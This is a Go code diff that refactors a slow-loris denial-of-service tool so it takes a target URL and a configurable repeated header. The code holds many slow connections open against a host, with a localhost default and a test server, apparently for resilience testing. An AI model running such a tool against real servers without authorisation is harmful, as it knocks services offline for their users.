@@ -2,8 +2,8 @@ package loris
 
 import (
 	"flag"
-	"fmt"
 	"net"
+	"net/url"
 	"os"
 	"strconv"
 	"time"
@@ -23,13 +23,12 @@ var (
 	flagOnce   = flagsLoris.Bool("once", false, "Establish a single connection")
 	flagTime   = flagsLoris.Duration("time", time.Hour, "How long to run the test for (not applicable if -once enabled)")
 	flagTest   = flagsLoris.Bool("test", false, "Runs an embedded server to connect to")
-	flagHost   = flagsLoris.String("host", "localhost", "The host to send the payload to")
-	flagPath   = flagsLoris.String("path", "/", "The path to send the request to")
-	flagPort   = flagsLoris.Int("port", 80, "The port to send the payload to")
 	flagSize   = flagsLoris.Int("size", 1_000_000, "The size of the request payload to send")
 	flagDelay  = flagsLoris.Duration("sd", 1*time.Second, "The delay in ms between each send")
-	flagBytes  = flagsLoris.Int("sb", 5, "The number of bytes to send in each send")
 	flagMax    = flagsLoris.Int("max", 1000, "The maximum number of connections to establish")
+	flagHeader = flagsLoris.String("header", "x-snacks-slow-loris: boom", "The HTTP header to repeat for the attack")
+
+	dest *url.URL
 )
 
 func Loris() {
@@ -37,12 +36,18 @@ func Loris() {
 	flagsLoris.Parse(os.Args[2:])
 	logFlags.Apply()
 
-	port := *flagPort
+	var urlString string
+	if len(flagsLoris.Args()) > 0 {
+		urlString = flagsLoris.Args()[0]
+	} else {
+		urlString = "http://localhost:80"
+	}
+	dest = helper.ParseUrl(urlString)
+
 	test := *flagTest
-	host := *flagHost
 	size := *flagSize
 	once := *flagOnce
-	// sendBytes := *flagBytes
+	header := *flagHeader + "\n"
 	sendDelay := *flagDelay
 	duration := *flagTime
 	maxConns := *flagMax
@@ -50,14 +55,14 @@ func Loris() {
 	logger.Info("Starting")
 
 	// Create a new Udy instance
-	dataProvider := udy.NewRepeaterDataProvider([]byte("x-snacks-slow-loris: boom\n"), size)
+	dataProvider := udy.NewRepeaterDataProvider([]byte(header), size)
 	sendStrategy := udy.NewFixedSendStrategy(sendDelay)
 	l := udy.NewUdy(dataProvider, sendStrategy, maxConns)
 
 	if test {
 		// Start a server which will receive the payload
 		serverReady := make(chan bool)
-		go helper.HttpServer(port, serverReady)
+		go helper.HttpServer(dest.Port(), serverReady)
 		<-serverReady
 	}
 
@@ -72,7 +77,7 @@ func Loris() {
 	} else {
 		logExecutionDetails("continuous", prefix)
 
-		go l.ExecuteContinuous(host, port, prefix, size)
+		go l.ExecuteContinuous(dest, prefix, size)
 
 		time.Sleep(duration)
 		// l.Stop()
@@ -91,13 +96,13 @@ func logExecutionDetails(execution string, prefix []byte) {
 	}
 	logger.WithFields(log.Fields{
 		"type":      execution,
-		"target":    fmt.Sprintf("%s:%d", *flagHost, *flagPort),
+		"target":    dest.Host,
 		"size":      *flagSize,
 		"duration":  *flagTime,
 		"test":      *flagTest,
-		"sendBytes": *flagBytes,
 		"sendDelay": *flagDelay,
 		"maxConns":  *flagMax,
+		"header":    *flagHeader,
 	}).Info("Starting Loris attack")
 }
 
@@ -114,11 +119,9 @@ func isPrintable(bytes []byte) bool {
 }
 
 func executeOnce(l udy.Udy, prefix []byte) {
-	host := *flagHost
-	port := *flagPort
 	size := *flagSize
+	target := dest.Host
 
-	target := fmt.Sprintf("%s:%d", host, port)
 	conn, err := net.Dial("tcp", target)
 	if err != nil {
 		logger.WithFields(log.Fields{
@@ -137,10 +140,9 @@ func getPayloadPrefix() []byte {
 }
 
 func getHTTPPayload(verb http.HttpVerb, media helper.MediaPrefix) []byte {
-	host := *flagHost
-	port := *flagPort
 	size := *flagSize
-	endpoint := *flagPath
+	host := dest.Host
+	endpoint := dest.Path
 
 	contentTypePrefix := media.Prefix()
 	contentTypePrefixLen := len(contentTypePrefix)
@@ -149,7 +151,7 @@ func getHTTPPayload(verb http.HttpVerb, media helper.MediaPrefix) []byte {
 		"Content-Type":   media.Name(),
 		"Accept":         "*/*",
 		"Content-Length": strconv.Itoa(size + contentTypePrefixLen),
-		"Host":           host + ":" + strconv.Itoa(port),
+		"Host":           host,
 	}
 
 	builder := http.HttpRequestBuilder{
